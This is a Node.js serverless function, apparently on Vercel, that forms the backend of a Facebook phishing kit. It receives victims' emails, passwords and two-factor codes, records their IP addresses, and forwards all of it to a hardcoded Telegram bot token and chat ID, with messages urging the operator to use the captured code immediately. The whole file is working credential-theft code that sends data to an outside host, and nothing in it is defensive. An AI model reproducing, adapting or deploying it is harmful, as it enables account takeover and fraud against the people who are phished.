const fetch = require('node-fetch');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only accept POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const { type, email, password, code, userAgent } = req.body;
    
    // Get IP
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress ||
               'Unknown';
    
    const now = new Date();
    const timestamp = now.toISOString();
    const localTime = now.toLocaleString('en-US', {
      timeZone: 'UTC',
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });
    
    // Telegram config
    const TELEGRAM_TOKEN = "8251102529:AAFUlxIRVM0Whp3Sd9K3d6WMvfu8ZCN7YQk";
    const TELEGRAM_CHAT_ID = "1622637334";
    
    let message = '';
    
    switch(type) {
      case 'login':
        message = `🔐 **FACEBOOK LOGIN - VERCEL** 🔐

📧 Email: \`${email || 'Not provided'}\`
🔑 Password: \`${password || 'Not provided'}\`

🌍 Network:
🕐 ${localTime}
📍 IP: \`${ip}\`
📱 ${userAgent?.includes('Mobile') ? 'Mobile' : 'Desktop'}

✅ Status: Login captured
➡️ Next: 2FA verification`;
        break;
        
      case 'verification':
        message = `✅ **2FA CODE CAPTURED - VERCEL** ✅

📧 Account: \`${email || 'Not provided'}\`
🔑 Password: \`${password || 'Not provided'}\`
🔢 2FA Code: \`${code || 'Not provided'}\`

🌍 Access:
🕐 ${localTime}
📍 IP: \`${ip}\`

🚨 ACCOUNT COMPROMISED
🎯 Use code immediately`;
        break;
        
      case 'resend':
        message = `🔄 **CODE RESEND - VERCEL** 🔄

📧 ${email || 'Not provided'}
🕐 ${localTime}
📍 IP: \`${ip}\`

📱 New code requested`;
        break;
        
      default:
        message = `📱 **Unknown request - VERCEL**\nIP: \`${ip}\`\nTime: ${localTime}`;
    }
    
    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    
    await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
    
    console.log(`[VERCEL] ${type}: ${(email || '').substring(0, 3)}*** - IP: ${ip}`);
    
    return res.status(200).json({ success: true, message: 'Processed' });
    
  } catch (error) {
    console.error('[VERCEL ERROR]:', error);
    return res.status(200).json({ success: true, error: error.message });
  }
};